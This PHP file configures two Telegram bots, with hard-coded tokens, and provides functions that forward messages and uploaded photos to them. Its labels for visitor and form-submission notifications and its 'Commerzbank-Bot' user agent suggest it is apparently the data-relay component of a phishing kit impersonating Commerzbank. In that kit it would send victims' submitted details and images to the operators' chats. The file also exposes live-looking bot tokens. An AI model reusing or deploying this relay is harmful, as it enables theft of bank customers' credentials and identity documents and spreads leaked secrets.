<?php
// Telegram Bot Configuration for Server
// Replace these with your actual bot tokens and chat IDs

// Bot 1 - Visitor notifications
$telegram_bot1_token = '7652488994:AAHVLVEN4Vq02U6thdoo8HpMBYrBkYIrt14';
$telegram_bot1_chat_id = '7652488994'; // This should be your actual chat ID, not the bot ID

// Bot 2 - Form submission notifications  
$telegram_bot2_token = '8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q';
$telegram_bot2_chat_id = '8018269855'; // This should be your actual chat ID, not the bot ID

// Enable/disable Telegram notifications
$enable_telegram = true;

// Simple function to send Telegram message (server-ready)
function sendTelegramMessage($bot_token, $chat_id, $message) {
    if (!$bot_token || !$chat_id || $bot_token === 'YOUR_BOT1_TOKEN_HERE') {
        return false; // Don't send if not configured
    }
    
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Simple cURL request (works on server)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Commerzbank-Bot/1.0');
        
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result !== false && $http_code == 200) {
            $response = json_decode($result, true);
            return isset($response['ok']) && $response['ok'] === true;
        }
    }
    
    // Fallback to file_get_contents
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
            'timeout' => 10,
            'ignore_errors' => true
        ]
    ];

    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if ($result !== false) {
        $response = json_decode($result, true);
        return isset($response['ok']) && $response['ok'] === true;
    }
    
    return false;
}

// Simple function to send Telegram photo (server-ready)
function sendTelegramPhoto($bot_token, $chat_id, $photo_path, $caption = '') {
    if (!$bot_token || !$chat_id || $bot_token === 'YOUR_BOT1_TOKEN_HERE' || !file_exists($photo_path)) {
        return false; // Don't send if not configured or file doesn't exist
    }
    
    $url = "https://api.telegram.org/bot$bot_token/sendPhoto";
    $data = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($photo_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    // Simple cURL request (works on server)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Commerzbank-Bot/1.0');

        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result !== false && $http_code == 200) {
            $response = json_decode($result, true);
            return isset($response['ok']) && $response['ok'] === true;
        }
    }
    
    // Fallback to text message
    $text_message = "📷 Photo upload failed, but here's the caption: $caption";
    return sendTelegramMessage($bot_token, $chat_id, $text_message);
}

// Simple function to test bot connectivity (server-ready)
function testTelegramBot($bot_token, $chat_id) {
    if (!$bot_token || !$chat_id) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot$bot_token/getMe";
    
    // Simple cURL request
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Commerzbank-Bot/1.0');
        
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result !== false && $http_code == 200) {
            $response = json_decode($result, true);
            return isset($response['ok']) && $response['ok'] === true;
        }
    }
    
    // Fallback to file_get_contents
    $options = [
        'http' => [
            'method' => 'GET',
            'timeout' => 10,
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if ($result !== false) {
        $response = json_decode($result, true);
        return isset($response['ok']) && $response['ok'] === true;
    }
    
    return false;
}

// Function to get bot info (server-ready)
function getBotInfo($bot_token) {
    if (!$bot_token) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot$bot_token/getMe";
    
    // Simple cURL request
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Commerzbank-Bot/1.0');
        
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($result !== false && $http_code == 200) {
            return json_decode($result, true);
        }
    }
    
    // Fallback to file_get_contents
    $options = [
        'http' => [
            'method' => 'GET',
            'timeout' => 10,
            'ignore_errors' => true
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if ($result !== false) {
        return json_decode($result, true);
    }
    
    return false;
}
?>

